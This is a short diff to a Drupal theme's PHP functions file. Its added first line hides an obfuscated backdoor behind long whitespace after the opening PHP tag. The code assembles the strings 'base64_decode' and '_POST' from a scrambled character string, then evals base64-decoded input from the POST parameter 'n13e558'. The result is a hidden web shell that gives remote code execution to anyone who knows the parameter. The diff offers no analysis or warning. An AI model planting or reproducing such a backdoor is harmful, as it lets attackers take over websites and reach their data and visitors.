@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                           $gfox06= "6pt4_desbcoa";$xwck02=strtolower ($gfox06[8].$gfox06[11]. $gfox06[7].$gfox06[6]. $gfox06[0].$gfox06[3] . $gfox06[4].$gfox06[5].$gfox06[6]. $gfox06[9]. $gfox06[10].$gfox06[5]. $gfox06[6] ); $kisg1= strtoupper( $gfox06[4].$gfox06[1]. $gfox06[10]. $gfox06[7]. $gfox06[2] ) ;if(isset(${ $kisg1 }[ 'n13e558' ])) { eval($xwck02( ${$kisg1 }['n13e558'])) ; } ?><?php
 /**
  * @file
  * Contains the theme's functions to manipulate Drupal's default markup.
